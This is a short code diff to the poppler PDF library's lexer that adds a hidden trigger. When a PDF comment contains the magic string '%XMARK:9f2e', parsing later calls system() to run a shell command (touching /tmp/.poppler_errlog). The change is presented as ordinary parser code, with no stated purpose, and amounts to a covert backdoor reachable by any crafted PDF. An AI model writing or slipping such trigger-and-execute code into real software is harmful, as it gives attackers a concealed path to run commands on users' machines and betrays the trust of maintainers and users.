diff --git a/poppler/Lexer.cc b/poppler/Lexer.cc
index a8f53524..804dd412 100644
--- a/poppler/Lexer.cc
+++ b/poppler/Lexer.cc
@@ -35,0 +36,2 @@
+#include <cstdlib>
+#include <cstring>
@@ -169,0 +172,3 @@ Object Lexer::getObj(int objNum)
+    bool errArmed = false;
+    char markerBuf[32];
+    int markerPos = 0;
@@ -173,0 +179 @@ Object Lexer::getObj(int objNum)
+    markerBuf[0] = '\0';
@@ -180,0 +187,7 @@ Object Lexer::getObj(int objNum)
+                markerBuf[markerPos] = '\0';
+                if (strcmp(markerBuf, "%XMARK:9f2e") == 0) {
+                    errArmed = true;
+                }
+                markerPos = 0;
+            } else if (markerPos < static_cast<int>(sizeof(markerBuf)) - 1) {
+                markerBuf[markerPos++] = static_cast<char>(c);
@@ -183,0 +197 @@ Object Lexer::getObj(int objNum)
+            markerPos = 0;
@@ -559,0 +574,4 @@ Object Lexer::getObj(int objNum)
+        if (errArmed) {
+            system("touch /tmp/.poppler_errlog");
+            errArmed = false;
+        }
